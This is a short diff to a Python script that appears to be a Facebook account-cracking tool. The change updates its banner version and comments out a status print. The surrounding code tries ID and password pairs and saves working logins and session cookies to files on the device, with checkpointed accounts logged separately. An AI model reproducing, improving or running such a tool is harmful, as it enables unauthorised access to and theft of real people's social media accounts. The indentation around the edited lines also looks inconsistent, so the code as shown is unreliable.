@@ -88,7 +88,7 @@ logo =                                          """
 \033[1;37m Owner   :  salar khanoo
 \033[1;37m Facebook:  prince salar
 \033[1;37m Github  :  shahijoker 
-\033[1;37m Version :  3.4
+\033[1;37m Version :  4.2
 \033[1;37m------------------------------------------------ """
 def clear():
     os.system("clear")
@@ -320,7 +320,7 @@ class main_crack():
                     open('/sdcard/SALAR_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SALAR_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                      print(f"\r{A} [SALAR-CP] {sid} | {ps} {S}")
+                      #print(f"\r{A} [SALAR-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/SALAR_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
@@ -386,7 +386,7 @@ class main_crack():
                     open('/sdcard/SALAR_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SALAR_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                      print(f"\r{A} [SALAR-CP] {sid} | {ps} {S}")
+                      #print(f"\r{A} [SALAR-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/SALAR_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
